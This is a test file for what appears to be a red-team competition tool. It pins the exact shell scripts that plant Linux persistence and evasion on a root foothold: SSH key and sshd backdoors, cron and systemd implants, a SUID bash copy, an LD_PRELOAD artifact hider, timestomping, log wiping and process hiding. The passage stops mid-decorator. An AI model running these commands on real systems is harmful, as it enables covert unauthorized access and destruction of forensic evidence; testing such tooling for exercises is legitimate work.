"""persist_linux — one test per family, at the exact-command-string level.

The point of this module is the command text: the mechanism per family carried
over from the earlier agent, with every literal replaced by a drawn name. So each
family test asserts the whole script the handler sends (the standing guard, the
earlier agent's command, the branch structure and the outcome marker), not merely
"something was sent".

`NAMES` is a hand-built full name set, so the expected strings are deterministic
and do not depend on the random draw (the draw itself is pinned in
test_effects.py).
"""

import base64
import shlex

import pytest

from tests.helpers import FakeSSH, base_cfg, make_ctx
from tlaloc.effects import execute
from tlaloc.effects import persist as persist_effect
from tlaloc.effects import persist_linux as pl

IP = "192.168.1.10"
USER = "ubuntu"
PW = "boxpw-1"

NAMES = {
    "stem": "dbus-broker",
    "mode": "full",
    "profile": "/etc/profile.d/40-refresh-env.sh",
    "sshd_dropin": "/etc/ssh/sshd_config.d/40-refresh.conf",
    "keys_dir": "/etc/ssh/.refresh-keys",
    "cron": "/etc/cron.d/renew",
    "cron_reaper": "/etc/cron.d/guard",
    "cron_marker": "/var/tmp/.sweep",
    "unit": "dbus-broker-refresh.service",
    "unit_desc": "DbusBrokerRefresh Service",
    "timer_unit": "dbus-broker-helper.service",
    "timer": "dbus-broker-helper.timer",
    "suid": "/usr/lib/.warden",
    "user": "svc-bridge",
    "key_comment": "probe",
    "log_cleanup": "/etc/cron.d/prune",
    "decoy_unit": "dbus-broker-store.service",
    "decoy_path": "/opt/dbus-broker-store/dbus-broker-store.sh",
    "hider_dir": "/usr/lib/.collector",
    "hider_so": "/usr/lib/.collector/libcollector.so",
    "hider_conf": "/etc/.collector.conf",
    "bait_lib": "/usr/local/lib/libdigest.so",
    "bait_dir": "/usr/local/lib/.digest",
    "bait_conf": "/usr/local/lib/.digest/hide.conf",
    "bait_pid": "/usr/local/lib/.digest/decoy.pid",
    "bait_state": "/var/lib/.digest-prev",
    "bait_staging": "/tmp/.digest-upload",
}

BAK = ".tlaloc-bak"
CREATE = "state=created"
PRESENT = "state=present"


# --- scaffolding -------------------------------------------------------------

def _ctx(tmp_path, ssh=None, **cfg_over):
    """A root foothold on IP, a scripted transport, a temp world."""
    extra = {"cfg": base_cfg(**cfg_over)} if cfg_over else {}
    ctx = make_ctx(tmp_path, ssh=ssh or FakeSSH(), **extra)
    ctx.world.add_foothold(IP, USER, PW, "root", escalation="sudo")
    return ctx


def _cmd(ssh, index=0):
    return ssh.calls[index]["cmd"]


def _sudo(script):
    """The script as root_cmd() wraps it for a `sudo` foothold label."""
    if "\n" in script:
        return f"sudo -n sh -c {shlex.quote(script)}"
    return f"sudo -n {script}"


def _inner(cmd):
    """The script inside the one root shell root_cmd() wraps multi-line text in."""
    parts = shlex.split(cmd)
    return parts[parts.index("-c") + 1]


def _wrap(family, guard, create, owned=None):
    """The plant-script skeleton `_wrap()` builds — spelled out here on purpose:
    a change to the skeleton is a change to every family's script."""
    lines = [f"if {guard}; then st=present; else", "  st=created"]
    if owned:
        lines.append(f"  [ -e {owned} ] && {{ mv -f {owned} {owned}{BAK} "
                     f"2>/dev/null && st=repaired; }}")
    lines.append(f"  {{ {create} ; }} || st=failed")
    lines += ["fi", f'echo "TLALOC_PLANT family={family} state=$st"']
    return "\n".join(lines)


def _b64(text):
    return base64.b64encode(text.encode()).decode()


def _staged(path, payload=b"\x7fELF fake"):
    path.write_bytes(payload)
    return str(path)


def _pubkey(ctx):
    from pathlib import Path
    return (Path(ctx.cfg["run"]["state_dir"]) / "red_key.pub").read_text().strip()


def _plant(tmp_path, family, ssh, extra=None):
    """Run one family against a scripted transport. Returns (result, ctx)."""
    ctx = _ctx(tmp_path, ssh)
    return pl.apply(ctx, IP, family, dict(extra or NAMES)), ctx


# --- the table and the contract ----------------------------------------------

def test_the_family_table_covers_the_linux_auto_order():
    assert list(pl.FAMILIES) == list(persist_effect.AUTO_ORDER_LINUX)
    assert set(persist_effect.families(windows=False)) == set(pl.FAMILIES)
    assert persist_effect.auto_order(windows=False) == \
        list(persist_effect.AUTO_ORDER_LINUX)


def test_apply_refuses_an_unknown_family_and_an_incomplete_name_set(tmp_path):
    ctx = _ctx(tmp_path)
    result = pl.apply(ctx, IP, "no_such_family", dict(NAMES))
    assert result.ok is False and "unknown linux family" in result.detail
    result = pl.apply(ctx, IP, "cron", {"cron": "/etc/cron.d/x"})
    assert result.ok is False and "incomplete" in result.detail
    assert ctx.ssh.calls == []


def test_apply_refuses_a_non_root_or_windows_foothold(tmp_path):
    ctx = make_ctx(tmp_path)
    ctx.world.add_foothold(IP, "analyst", "pw", "user")
    result = pl.apply(ctx, IP, "cron", dict(NAMES))
    assert result.ok is False and "root" in result.detail
    win = make_ctx(tmp_path / "win")
    win.world.add_foothold(IP, "Administrator", "pw", "root", windows=True)
    result = pl.apply(win, IP, "cron", dict(NAMES))
    assert result.ok is False and "persist_windows" in result.detail


def test_dry_run_never_touches_the_box(tmp_path):
    ssh = FakeSSH()
    ctx = make_ctx(tmp_path, ssh=ssh, dry_run=True)
    ctx.world.add_foothold(IP, USER, PW, "root", escalation="sudo")
    result = execute("persist", {"ip": IP, "family": "auto"}, ctx)
    assert result.ok and "dry-run" in result.detail
    assert ssh.calls == [] and ctx.world.artifacts() == []


def test_persist_check_rejects_an_unknown_family_and_a_missing_foothold(tmp_path):
    ctx = _ctx(tmp_path)
    result = execute("persist", {"ip": IP, "family": "nope"}, ctx)
    assert result.ok is False and result.detail.startswith("precondition:")
    bare = make_ctx(tmp_path / "bare")
    result = execute("persist", {"ip": IP, "family": "cron"}, bare)
    assert result.ok is False and "foothold" in result.detail


# --- one test per family ------------------------------------------------------

def test_systemd_unit_plants_the_sleeper_unit(tmp_path):
    ssh = FakeSSH().on(pl.MARKER, out=f"TLALOC_PLANT family=systemd_unit {CREATE}")
    result, ctx = _plant(tmp_path, "systemd_unit", ssh)
    unit = NAMES["unit"]
    path = f"/etc/systemd/system/{unit}"
    body = ("[Unit]\nDescription=DbusBrokerRefresh Service\n[Service]\n"
            "ExecStart=/bin/sh -c 'while :; do sleep 300; done'\n[Install]\n"
            "WantedBy=multi-user.target\n")
    create = (f"echo {_b64(body)} | base64 -d > {path} && systemctl daemon-reload "
              f"&& systemctl enable --now {unit} >/dev/null")
    guard = f"[ -f {path} ] && systemctl is-enabled {unit} >/dev/null 2>&1"
    assert _cmd(ssh) == _sudo(_wrap("systemd_unit", guard, create, owned=path))
    assert result.ok and result.artifacts[0]["kind"] == "persist-systemd_unit"
    assert result.artifacts[0]["paths"] == [path]
    assert result.artifacts[0]["check_cmd"] == \
        f"systemctl is-enabled {unit} 2>/dev/null | grep -q enabled"


def test_profile_writes_the_login_time_re_asserter(tmp_path):
    ssh = FakeSSH().on(pl.MARKER, out=f"TLALOC_PLANT family=profile {CREATE}")
    result, ctx = _plant(tmp_path, "profile", ssh)
    pub = _pubkey(ctx)
    path = NAMES["profile"]
    body = ("#!/bin/sh\n# network telemetry helper\n"
            "mkdir -p /home/ubuntu/.ssh 2>/dev/null\n"
            "grep -qF probe /home/ubuntu/.ssh/authorized_keys 2>/dev/null || "
            f"echo '{pub}' >> /home/ubuntu/.ssh/authorized_keys 2>/dev/null\n")
    guard = f"[ -f {path} ] && grep -qF probe {path}"
    create = f"echo {_b64(body)} | base64 -d > {path} && chmod 644 {path}"
    assert _cmd(ssh) == _sudo(_wrap("profile", guard, create, owned=path))
    assert result.ok and result.artifacts[0]["paths"] == [path]


def test_sshd_dropin_adds_a_red_controlled_key_file(tmp_path):
    ssh = FakeSSH().on(pl.MARKER, out=f"TLALOC_PLANT family=sshd_dropin {CREATE}")
    result, ctx = _plant(tmp_path, "sshd_dropin", ssh)
    pub = _pubkey(ctx)
    dropin, keydir = NAMES["sshd_dropin"], NAMES["keys_dir"]
    body = f"AuthorizedKeysFile {keydir}/%u .ssh/authorized_keys\n"
    guard = f"[ -f {dropin} ] && [ -f {keydir}/{USER} ]"
    create = (f"mkdir -p {keydir} && chmod 700 {keydir} && "
              f"mkdir -p /etc/ssh/sshd_config.d && "
              f"echo {_b64(body)} | base64 -d > {dropin} && chmod 644 {dropin} && "
              f"printf '%s\\n' '{pub}' > {keydir}/{USER} && "
              f"chmod 600 {keydir}/{USER} && "
              f"(systemctl reload ssh 2>/dev/null || systemctl reload sshd "
              f"2>/dev/null || true)")
    assert _cmd(ssh) == _sudo(_wrap("sshd_dropin", guard, create, owned=dropin))
    assert result.ok and result.artifacts[0]["paths"] == [dropin, keydir]


def test_cron_plants_the_marker_beacon(tmp_path):
    ssh = FakeSSH().on(pl.MARKER, out=f"TLALOC_PLANT family=cron {CREATE}")
    result, ctx = _plant(tmp_path, "cron", ssh)
    path, marker = NAMES["cron"], NAMES["cron_marker"]
    guard = f"[ -f {path} ] && grep -qF '{marker}' {path}"
    create = (f"echo '*/10 * * * * root /bin/sh -c \"touch {marker}\"' > {path} "
              f"&& chmod 644 {path}")
    assert _cmd(ssh) == _sudo(_wrap("cron", guard, create, owned=path))
    assert result.ok and result.artifacts[0]["paths"] == [path]
    assert result.artifacts[0]["check_cmd"] == f"test -f {path}"


def test_cron_reaper_targets_the_service_we_already_took_down(tmp_path):
    ssh = FakeSSH().on(pl.MARKER, out=f"TLALOC_PLANT family=cron_reaper {CREATE}")
    ctx = _ctx(tmp_path, ssh)
    ctx.world.add_impact(IP, "apache2", "stop_mask")
    result = pl.apply(ctx, IP, "cron_reaper", dict(NAMES))
    path = NAMES["cron_reaper"]
    line = ('*/5 * * * * root /bin/sh -c "systemctl stop apache2 >/dev/null '
            '2>&1 || true"')
    guard = f"[ -f {path} ] && grep -qF 'stop apache2' {path}"
    create = f"printf '%s\\n' '{line}' > {path} && chmod 644 {path}"
    assert _cmd(ssh) == _sudo(_wrap("cron_reaper", guard, create, owned=path))
    assert result.ok and "apache2" in result.detail


def test_cron_reaper_refuses_without_an_impact_and_never_reaps_ssh(tmp_path):
    ssh = FakeSSH()
    ctx = _ctx(tmp_path, ssh)
    result = pl.apply(ctx, IP, "cron_reaper", dict(NAMES))
    assert result.ok is False and "no downed scored service" in result.detail
    ctx.world.add_impact(IP, "sshd", "stop")
    result = pl.apply(ctx, IP, "cron_reaper", dict(NAMES))
    assert result.ok is False and "refusing to re-kill ssh" in result.detail
    assert ssh.calls == [], "a refused reaper must not touch the box"


def test_timer_plants_the_unit_pair(tmp_path):
    ssh = FakeSSH().on(pl.MARKER, out=f"TLALOC_PLANT family=timer {CREATE}")
    result, ctx = _plant(tmp_path, "timer", ssh)
    timer = NAMES["timer"]
    svc_path = f"/etc/systemd/system/{NAMES['timer_unit']}"
    tmr_path = f"/etc/systemd/system/{timer}"
    profile = NAMES["profile"]
    svc_body = ("[Unit]\nDescription=DbusBrokerHelper Timer\n\n[Service]\n"
                "Type=oneshot\n"
                f"ExecStart=/bin/sh -c 'test -f {profile} || "
                'echo "" > ' + profile + "; exit 0'\n")
    tmr_body = ("[Unit]\nDescription=DbusBrokerHelper Timer\n\n[Timer]\n"
                "OnBootSec=2min\nOnUnitActiveSec=5min\n\n[Install]\n"
                "WantedBy=timers.target\n")
    guard = (f"[ -f {svc_path} ] && [ -f {tmr_path} ] && "
             f"systemctl is-enabled {timer} >/dev/null 2>&1")
    create = (f"echo {_b64(svc_body)} | base64 -d > {svc_path} && "
              f"echo {_b64(tmr_body)} | base64 -d > {tmr_path} && "
              f"systemctl daemon-reload && systemctl enable --now {timer} && "
              f"systemctl is-enabled {timer}")
    assert _cmd(ssh) == _sudo(_wrap("timer", guard, create, owned=svc_path))
    assert result.ok and result.artifacts[0]["paths"] == [svc_path, tmr_path]


def test_user_cron_appends_once_behind_the_presence_guard(tmp_path):
    ssh = FakeSSH().on(pl.MARKER, out=f"TLALOC_PLANT family=user_cron {CREATE}")
    result, ctx = _plant(tmp_path, "user_cron", ssh)
    marker = NAMES["cron_marker"]
    line = f"*/7 * * * * /bin/sh -c 'touch {marker}' >/dev/null 2>&1"
    guard = f"crontab -u {USER} -l 2>/dev/null | grep -qF 'touch {marker}'"
    create = (f"( crontab -u {USER} -l 2>/dev/null | grep -qF 'touch {marker}' || "
              f"( (crontab -u {USER} -l 2>/dev/null; echo \"{line}\") | "
              f"crontab -u {USER} - 2>/dev/null ) ) && "
              f"loginctl enable-linger {USER} >/dev/null 2>&1")
    assert _cmd(ssh) == _sudo(_wrap("user_cron", guard, create))
    assert result.ok and "linger" in result.detail
    assert marker in " ".join(result.restore["recipe"])


def test_user_cron_refuses_a_root_only_foothold(tmp_path):
    ssh = FakeSSH()
    ctx = _ctx(tmp_path, ssh)
    ctx.world.add_foothold(IP, "root", PW, "root", escalation="sudo")
    result = pl.apply(ctx, IP, "user_cron", dict(NAMES))
    assert result.ok is False and "foothold is root" in result.detail
    assert ssh.calls == []


def test_keys_installs_the_re_entry_key_for_the_user_and_root(tmp_path):
    ssh = FakeSSH().on(pl.MARKER, out=f"TLALOC_PLANT family=keys {CREATE}")
    result, ctx = _plant(tmp_path, "keys", ssh)
    pub = _pubkey(ctx)
    user_keys = "/home/ubuntu/.ssh/authorized_keys"
    root_keys = "/root/.ssh/authorized_keys"
    guard = (f"grep -qF probe {user_keys} 2>/dev/null && "
             f"grep -qF probe {root_keys} 2>/dev/null")
    create = (f"mkdir -p /home/ubuntu/.ssh && chmod 700 /home/ubuntu/.ssh && "
              f"touch {user_keys} && ( grep -qF probe {user_keys} 2>/dev/null "
              f"|| echo '{pub}' >> {user_keys} ) && chmod 600 {user_keys} && "
              f"mkdir -p /root/.ssh && touch {root_keys} && "
              f"( grep -qF probe {root_keys} 2>/dev/null || echo '{pub}' >> "
              f"{root_keys} ) && chmod 600 {root_keys}")
    assert _cmd(ssh) == _sudo(_wrap("keys", guard, create))
    assert result.ok and result.artifacts[0]["paths"] == [user_keys, root_keys]
    assert result.artifacts[0]["check_cmd"] == (
        f"grep -qF probe {user_keys} 2>/dev/null || "
        f"grep -qF probe {root_keys} 2>/dev/null")


def test_suid_copies_bash_and_sets_the_bit(tmp_path):
    ssh = FakeSSH().on(pl.MARKER, out=f"TLALOC_PLANT family=suid {CREATE}")
    result, ctx = _plant(tmp_path, "suid", ssh)
    dest = NAMES["suid"]
    guard = f"test -u {dest}"
    create = (f"(cp -f /bin/bash {dest} 2>/dev/null || cp -f /usr/bin/bash {dest}) "
              f"&& chmod 4755 {dest} && test -u {dest}")
    assert _cmd(ssh) == _sudo(_wrap("suid", guard, create, owned=dest))
    assert result.ok and result.artifacts[0]["check_cmd"] == f"test -u {dest}"


def test_preload_hides_reds_artifacts_behind_a_load_tested_hider(tmp_path):
    so = _staged(tmp_path / "hider.so")
    ssh = FakeSSH()
    ssh.on(pl.PROBE, out="TLALOC_PROBE state=absent")
    ssh.on(pl.MARKER, out="TLALOC_PLANT family=preload_install state=enabled")
    ctx = _ctx(tmp_path, ssh, evasion={"preload_so": so})
    ctx.world.add_artifact(IP, "persist-cron", "cron (/etc/cron.d/renew)",
                           paths=["/etc/cron.d/renew"])
    result = pl.apply(ctx, IP, "preload", dict(NAMES))
    hider, conf = NAMES["hider_so"], NAMES["hider_conf"]
    # 1: the standing probe — nothing is written before we know it is needed
    assert _cmd(ssh, 0) == _sudo(
        f"if grep -qF {hider} /etc/ld.so.preload 2>/dev/null && [ -f {hider} ]; "
        f'then echo "TLALOC_PROBE state=present"; '
        f'else echo "TLALOC_PROBE state=absent"; fi')
    # 2: the upload to the earlier agent's /tmp/.<name>-upload staging path, then
    # the install
    assert ssh.calls[1]["kind"] == "sftp_put"
    assert ssh.calls[1]["cmd"] == "sftp put -> /tmp/.collector-upload"
    script = _cmd(ssh, 2)
    assert script.startswith("sudo -n sh -c ") and "set -u" in script
    # the conf is the hide list (red's own artifact names), base64'd like the
    # earlier agent's
    assert f"echo {_b64('name renew\n')} | base64 -d > {conf}" in script
    # the load test gates the preload line: the box-breaking invariant
    assert f"LD_PRELOAD={hider} /bin/true >/dev/null 2>&1" in script
    assert (f"grep -qF {hider} /etc/ld.so.preload || echo {hider} >> "
            "/etc/ld.so.preload") in script
    assert 'echo "TLALOC_PLANT family=preload_install state=$st"' in script
    assert result.ok and result.artifacts[0]["paths"] == [hider, conf]
    assert result.artifacts[0]["check_cmd"] == f"grep -qF {hider} /etc/ld.so.preload"


def test_preload_refuses_without_a_staged_so_and_when_the_load_test_fails(tmp_path):
    ssh = FakeSSH()
    ctx = _ctx(tmp_path, ssh)
    ctx.world.add_artifact(IP, "persist-cron", "cron (/etc/cron.d/renew)",
                           paths=["/etc/cron.d/renew"])
    result = pl.apply(ctx, IP, "preload", dict(NAMES))
    assert result.ok is False and "not staged" in result.detail
    assert ssh.calls == []

    # a refused load test: the box changed (files parked), the plant failed
    so = _staged(tmp_path / "hider.so")
    ssh2 = FakeSSH()
    ssh2.on(pl.PROBE, out="TLALOC_PROBE state=absent")
    ssh2.on(pl.MARKER, out="TLALOC_PLANT family=preload_install state=refused")
    ctx2 = _ctx(tmp_path / "refused", ssh2, evasion={"preload_so": so})
    ctx2.world.add_artifact(IP, "persist-cron", "cron (/etc/cron.d/renew)",
                            paths=["/etc/cron.d/renew"])
    result = pl.apply(ctx2, IP, "preload", dict(NAMES))
    assert result.ok is False and result.installed is True
    assert "left untouched" in result.detail and result.artifacts
    assert result.restore and result.restore["recipe"]


def test_immu_hardens_reds_planted_paths(tmp_path):
    ssh = FakeSSH().on(pl.MARKER, out="TLALOC_PLANT family=immu state=created "
                                      "new=1 had=0 miss=0")
    ctx = _ctx(tmp_path, ssh)
    ctx.world.add_artifact(IP, "persist-cron", "cron (/etc/cron.d/renew)",
                           paths=["/etc/cron.d/renew"])
    result = pl.apply(ctx, IP, "immu", dict(NAMES))
    script = _cmd(ssh)
    assert "for p in /etc/cron.d/renew; do" in script
    assert 'lsattr -d "$p" 2>/dev/null | cut -d" " -f1 | grep -q i' in script
    assert 'elif chattr +i "$p" 2>/dev/null; then new=$((new+1));' in script
    assert f'echo "{pl.MARKER} family=immu state=$st" new=$new had=$had miss=$miss' \
        in script
    assert result.ok and result.artifacts[0]["kind"] == "persist-immu"
    assert result.artifacts[0]["paths"] == ["/etc/cron.d/renew"]
    assert result.restore["recipe"] == ["chattr -i /etc/cron.d/renew"]


def test_immu_reports_honestly_with_nothing_planted(tmp_path):
    ssh = FakeSSH()
    result, _ = _plant(tmp_path, "immu", ssh)
    assert result.ok is False and "nothing planted" in result.detail
    assert ssh.calls == []


def test_timestomp_matches_the_reference_mtime_and_records_the_original(tmp_path):
    ssh = FakeSSH().on(pl.MARKER,
                       out="TLALOC_MTIME 1700000000 /etc/cron.d/renew\n"
                           "TLALOC_PLANT family=timestomp state=stomped")
    ctx = _ctx(tmp_path, ssh)
    ctx.world.add_artifact(IP, "persist-cron", "cron (/etc/cron.d/renew)",
                           paths=["/etc/cron.d/renew"])
    result = pl.apply(ctx, IP, "timestomp", dict(NAMES))
    script = _cmd(ssh)
    assert 'touch -r /etc/hostname "$p" 2>/dev/null' in script
    assert ('[ "$(stat -c %Y "$p" 2>/dev/null)" = '
            '"$(stat -c %Y /etc/hostname 2>/dev/null)" ] || same=0') in script
    assert 'printf "TLALOC_MTIME %s %s\\n" "$(stat -c %Y "$p" 2>/dev/null)" "$p"' \
        in script
    assert result.ok
    assert result.restore["recipe"] == ["touch -d @1700000000 /etc/cron.d/renew"]


def test_logwipe_rotates_before_it_truncates(tmp_path):
    ssh = FakeSSH().on(pl.MARKER, out=f"TLALOC_PLANT family=logwipe {CREATE}")
    result, ctx = _plant(tmp_path, "logwipe", ssh)
    cron, helper = NAMES["log_cleanup"], "/var/tmp/.sweep.sh"
    qdir = "/var/tmp/.sweep.bak"
    body = "\n".join([
        "#!/bin/sh",
        f"mkdir -p {qdir}",
        f"cp -a /var/log/auth.log {qdir}/auth.log.$(date +%s) 2>/dev/null || true",
        f"cp -a /var/log/syslog {qdir}/syslog.$(date +%s) 2>/dev/null || true",
        "journalctl --vacuum-time=1s >/dev/null 2>&1 || true",
        ": > /var/log/auth.log 2>/dev/null || true",
        ": > /var/log/syslog 2>/dev/null || true",
        "",
    ])
    guard = f"[ -f {cron} ] && [ -x {helper} ]"
    create = (f"echo {_b64(body)} | base64 -d > {helper} && chmod 755 {helper} && "
              f"printf '%s\\n' '*/15 * * * * root /bin/sh {helper}' > {cron} && "
              f"chmod 644 {cron} && /bin/sh {helper}")
    assert _cmd(ssh) == _sudo(_wrap("logwipe", guard, create, owned=helper))
    assert result.ok and result.artifacts[0]["paths"] == [cron, helper, qdir]


def test_decoy_plants_the_procfilter_hunt_bait_behind_the_load_test(tmp_path):
    install_dir = tmp_path / "procfilter"
    install_dir.mkdir()
    _staged(install_dir / "procfilter.so")
    ssh = FakeSSH()
    ssh.on(pl.PROBE, out="TLALOC_PROBE state=absent")
    ssh.on(pl.MARKER, out="TLALOC_PID 4242 /usr/local/lib/libdigest.so\n"
                          "TLALOC_PLANT family=preload_install state=hidden")
    ctx = _ctx(tmp_path, ssh, procfilter={"install_dir": str(install_dir)},
               effects={"decoy": True})
    result = pl.apply(ctx, IP, "decoy", dict(NAMES))
    lib, state = NAMES["bait_lib"], NAMES["bait_state"]
    assert _cmd(ssh, 0) == _sudo(
        f"if test -f {state} && kill -0 $(cut -d' ' -f1 {state} 2>/dev/null) "
        f"2>/dev/null && grep -qF {lib} /etc/ld.so.preload 2>/dev/null; "
        f'then echo "TLALOC_PROBE state=present"; '
        f'else echo "TLALOC_PROBE state=absent"; fi')
    assert ssh.calls[1]["kind"] == "sftp_put"
    assert ssh.calls[1]["cmd"] == "sftp put -> /tmp/.digest-upload"
    script = _inner(_cmd(ssh, 2))
    # the filter is moved into place from staging, then load-tested
    assert f"mkdir -p /usr/local/lib && mv -f {NAMES['bait_staging']} {lib} && " \
           f"chmod 644 {lib} || st=failed" in script
    assert f"LD_PRELOAD={lib} /bin/true >/dev/null 2>&1" in script
    assert (f"grep -qF {lib} /etc/ld.so.preload || echo {lib} >> "
            "/etc/ld.so.preload") in script
    # the decoy sleeper, argv smeared to a kernel-thread name (the earlier
    # agent's proc_hide)
    kthreads = [k for k in pl.KTHREADS if f'exec -a "{k}"' in script]
    assert len(kthreads) == 1
    assert (f"setsid /bin/sh -c 'echo $$ > {NAMES['bait_pid']}; "
            f'exec -a "{kthreads[0]}" /bin/sh -c "while :; do sleep 60; done"\' '
            ">/dev/null 2>&1 </dev/null &") in script
    # HIDDEN requires alive + present in /proc + absent from a /proc listing
    assert '! ls /proc 2>/dev/null | grep -qw "$_p"' in script
    assert "if kill -0 \"$_op\" 2>/dev/null; then _p=$_op; else" in script
    assert result.ok and "hidden" in result.detail
    artifact = result.artifacts[0]
    assert artifact["kind"] == "persist-decoy"
    assert artifact["check_cmd"] == ("test -d /proc/4242 && ! ls /proc 2>/dev/null "
                                     "| grep -qw 4242")
    assert set(artifact["paths"]) == {lib, NAMES["bait_conf"], state,
                                      NAMES["bait_pid"]}
    assert any("blue recovery" in note for note in ctx.world.target(IP)["notes"])


def test_decoy_is_off_by_default_and_reports_a_missing_filter(tmp_path):
    ssh = FakeSSH()
    ctx = _ctx(tmp_path, ssh)
    result = pl.apply(ctx, IP, "decoy", dict(NAMES))
    assert result.ok is False and "off by default" in result.detail
    assert ssh.calls == []

    ctx = _ctx(tmp_path / "on", ssh, effects={"decoy": True})
    result = pl.apply(ctx, IP, "decoy", dict(NAMES))
    assert result.ok is False and "not staged" in result.detail
    assert ssh.calls == []


def test_decoy_miss_is_recorded_but_not_claimed(tmp_path):
    install_dir = tmp_path / "procfilter"
    install_dir.mkdir()
    _staged(install_dir / "procfilter.so")
    ssh = FakeSSH()
    ssh.on(pl.PROBE, out="TLALOC_PROBE state=absent")
    ssh.on(pl.MARKER, out="TLALOC_PID 4242 /usr/local/lib/libdigest.so\n"
                          "TLALOC_PLANT family=preload_install state=miss")
    ctx = _ctx(tmp_path, ssh, procfilter={"install_dir": str(install_dir)},
               effects={"decoy": True})
    result = pl.apply(ctx, IP, "decoy", dict(NAMES))
    assert result.ok is False and result.installed is True
    assert "did not hold" in result.detail
    assert result.artifacts, "a box that changed is recorded even when it failed"
    assert result.restore["recipe"]


# --- idempotency (the one behaviour that must never be wrong) -----------------

def _answer(ssh, out):
    """Re-script the transport's plant answer (FakeSSH resolves in registration
    order and has no notion of "next call")."""
    ssh._rules.clear()
    ssh.on(pl.MARKER, out=out)


def test_a_second_plant_of_a_standing_family_writes_nothing(tmp_path):
    ssh = FakeSSH()
    _answer(ssh, f"TLALOC_PLANT family=cron {CREATE}")
    ctx = _ctx(tmp_path, ssh)
    first = execute("persist", {"ip": IP, "family": "cron"}, ctx)
    assert first.ok and first.data["state"] == "created"
    assert len(ctx.world.artifacts(IP)) == 1
    assert len(ctx.world.restore_table()) == 1

    # the same plant again, on a box that already carries the artifact
    _answer(ssh, f"TLALOC_PLANT family=cron {PRESENT}")
    second = pl.apply(ctx, IP, "cron", dict(NAMES))
    assert second.ok, second.detail
    assert second.data["state"] == "present"
    assert second.artifacts == [], "nothing was written, so nothing is recorded"
    assert second.restore is None
    assert len(ctx.world.artifacts(IP)) == 1, "re-assertion must not duplicate"
    assert len(ctx.world.restore_table()) == 1
    # and the script that produced it can only take the present branch: every
    # write sits behind the guard the standing check uses
    assert "then st=present; else" in _cmd(ssh, 1)


def test_re_assertion_never_duplicates_on_the_box(tmp_path):
    """The shell half of idempotency: every append is guarded, so a box that
    already has the line cannot get a second one."""
    keys_ssh = FakeSSH().on(pl.MARKER, out=f"TLALOC_PLANT family=keys {CREATE}")
    ctx = _ctx(tmp_path, keys_ssh)
    pl.apply(ctx, IP, "keys", dict(NAMES))
    pub = _pubkey(ctx)
    script = _inner(_cmd(keys_ssh))
    for path in ("/home/ubuntu/.ssh/authorized_keys", "/root/.ssh/authorized_keys"):
        guard = f"grep -qF probe {path} 2>/dev/null"
        assert f"( {guard} || echo '{pub}' >> {path} )" in script, path

    cron_ssh = FakeSSH().on(pl.MARKER, out=f"TLALOC_PLANT family=user_cron {CREATE}")
    ctx2 = _ctx(tmp_path / "cron", cron_ssh)
    pl.apply(ctx2, IP, "user_cron", dict(NAMES))
    assert ("| grep -qF 'touch /var/tmp/.sweep' || ( (crontab"
            in _inner(_cmd(cron_ssh)))


def test_auto_walks_the_order_and_a_forced_re_plant_adds_a_family(tmp_path):
    ssh = FakeSSH().on(pl.MARKER, out=f"TLALOC_PLANT family=cron {CREATE}")
    ctx = _ctx(tmp_path, ssh)
    first = execute("persist", {"ip": IP, "family": "auto"}, ctx)
    assert first.ok and first.data["family"] == "systemd_unit"
    second = execute("persist", {"ip": IP, "family": "auto"}, ctx)
    assert second.ok and second.data["family"] == "profile"
    assert set(persist_effect.standing_families(ctx.world, IP)) == \
        {"systemd_unit", "profile"}
    # blue cleans one away: the re-plant rung names it and draws fresh names
    ctx.world.set_dead_artifacts({f"{IP}|persist-systemd_unit|"})
    again = execute("persist", {"ip": IP, "family": "systemd_unit",
                                "force": "true"}, ctx)
    assert again.ok and again.data["family"] == "systemd_unit"
    assert again.data["names"]["unit"] != NAMES["unit"]
    assert len(ctx.world.artifacts(IP)) == 3


# --- restore-table completeness ----------------------------------------------

def test_every_artifact_has_a_restore_recipe_that_names_it(tmp_path):
    """Non-negotiable: every path a family plants appears in its undo recipe, so
    the organizer's restore table is complete."""
    ssh = FakeSSH()
    ctx = _ctx(tmp_path, ssh)
    ctx.cfg["evasion"] = {"preload_so": _staged(tmp_path / "hider.so")}
    install_dir = tmp_path / "procfilter"
    install_dir.mkdir()
    _staged(install_dir / "procfilter.so")
    ctx.cfg["procfilter"] = {"install_dir": str(install_dir)}
    ctx.cfg["effects"]["decoy"] = True
    # something to harvest: immu/timestomp/preload need a plant to work on
    ctx.world.add_artifact(IP, "persist-cron", "cron (/etc/cron.d/renew)",
                           paths=["/etc/cron.d/renew"])
    ctx.world.add_impact(IP, "apache2", "stop")          # cron_reaper's target
    mtimes = "".join(f"TLALOC_MTIME 1700000000 {p}\n"
                     for p in pl.artifact_paths(ctx.world, IP))
    outputs = {
        "systemd_unit": "state=created", "profile": "state=created",
        "sshd_dropin": "state=created", "cron": "state=created",
        "cron_reaper": "state=created", "timer": "state=created",
        "user_cron": "state=created", "keys": "state=created",
        "suid": "state=created", "immu": "state=created new=1 had=0 miss=0",
        "timestomp": "state=stomped", "logwipe": "state=created",
        "preload": "state=enabled", "decoy": "state=hidden",
    }
    for family in pl.FAMILIES:
        ssh._rules.clear()
        ssh.on(pl.PROBE, out="TLALOC_PROBE state=absent")
        if family == "preload":
            out = "TLALOC_PLANT family=preload_install state=enabled"
        elif family == "decoy":
            out = (f"TLALOC_PID 4242 {NAMES['bait_lib']}\n"
                   "TLALOC_PLANT family=decoy state=hidden")
        else:
            out = f"TLALOC_PLANT family={family} " + outputs[family]
            if family == "timestomp":
                out = mtimes + out
        ssh.on(pl.MARKER, out=out)
        result = pl.apply(ctx, IP, family, dict(NAMES))
        assert result.ok, f"{family}: {result.detail}"
        assert result.artifacts, f"{family}: planted but recorded nothing"
        assert result.restore and result.restore["recipe"], family
        recipe = result.restore["recipe"]
        for artifact in result.artifacts:
            assert artifact["ip"] == IP
            assert artifact["kind"] == f"persist-{family}"
            assert artifact["detail"]
            for path in artifact["paths"]:
                assert any(path in step for step in recipe), (family, path)


# --- failure paths -----------------------------------------------------------

def test_a_transport_blowup_is_ok_false_with_the_reason(tmp_path):
    ssh = FakeSSH().on(pl.MARKER, rc="raise")
    result, ctx = _plant(tmp_path, "systemd_unit", ssh)
    assert result.ok is False and "TransportError" in result.detail
    assert ctx.world.artifacts(IP) == [] and ctx.world.restore_table() == []


@pytest.mark.parametrize("rc,out,err,needle", [
    (1, "", "permission denied", "rc=1"),
    (0, "whoami\n", "", "no TLALOC_PLANT marker"),
    (0, "TLALOC_PLANT family=cron state=failed", "", "did not complete"),
])
